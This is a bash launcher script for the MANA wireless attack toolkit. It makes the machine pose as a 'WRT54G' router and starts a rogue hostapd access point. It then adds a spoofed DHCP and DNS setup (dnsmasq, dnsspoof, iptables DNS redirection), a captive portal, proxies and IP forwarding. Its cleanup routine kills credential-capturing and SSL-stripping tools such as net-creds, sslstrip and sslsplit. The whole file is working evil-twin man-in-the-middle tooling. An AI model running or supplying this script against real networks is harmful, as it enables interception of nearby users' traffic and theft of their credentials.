#!/bin/bash
etc=/etc/mana-toolkit
lib=/usr/lib/mana-toolkit
loot=/var/lib/mana-toolkit
share=/usr/share/mana-toolkit
set -x
phy=wlan0
conf=$etc/hostapd-mana.conf
hostapd=$lib/hostapd
set -x
hostname WRT54G
echo hostname WRT54G
sleep 2

#service network-manager stop
rfkill unblock wlan

#ifconfig $phy down
#macchanger -r $phy
#ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
#$hostapd $conf&

#  $nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
  sleep 9
#echo "Starting hostapd"
hostapd /etc/hostapd/hostapd.conf&
# ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
  sleep 5

sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dnsmasq -z -C $etc/dnsmasq-dhcpd.conf -i $phy -I lo
dnsspoof -i $phy -f $etc/dnsspoof.conf&
service apache2 start
stunnel4 $etc/stunnel.conf
tinyproxy -c $etc/tinyproxy.conf&
#msfconsole -r $etc/karmetasploit.rc& #Remove "&" to fix msfconsole exiting 
echo "Starting nodogsplash"
nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &

echo '1' > /proc/sys/net/ipv4/ip_forward
#iptables --policy INPUT ACCEPT
#iptables --policy FORWARD ACCEPT
#iptables --policy OUTPUT ACCEPT
#iptables -F
#iptables -t nat -F
iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
iptables -A FORWARD -i $phy -o eth0 -j ACCEPT
##iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000

killem(){
        echo "[*] Killing...."
        service apache2 stop

        pkill -f airbase
        pkill -f dhcpd
        pkill -f start_dnsmasq
        pkill -f dnsspoof
        pkill -f dnsmasq
        pkill -f dns2proxy
        pkill -f firelamb
        pkill -f start_firelamb
        pkill -f hostapd
        pkill -f start_hostapd
#        pkill -f msfconsole
#        pkill -f start_msfconsole
        pkill -f start_nat_firewall
        pkill -f net-creds
        pkill -f nodogsplash
#        pkill -f python
#        pkill -f ruby
        pkill -f sslsplit
        pkill -f sslstrip
        pkill -f stunnel4
        pkill -f tinyproxy

        rm --verbose --force $EXNODE
        rm --verbose --force /tmp/crackapd.run

        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -t nat -F
echo "Dont forget to kill msfconsole"
exit
}

echo "Hit enter to kill me"
read
killem

pkill hostapd
pkill dnsmasq
pkill dnsspoof
pkill tinyproxy
pkill stunnel4
pkill ruby
service apache2 stop
iptables -t nat -F
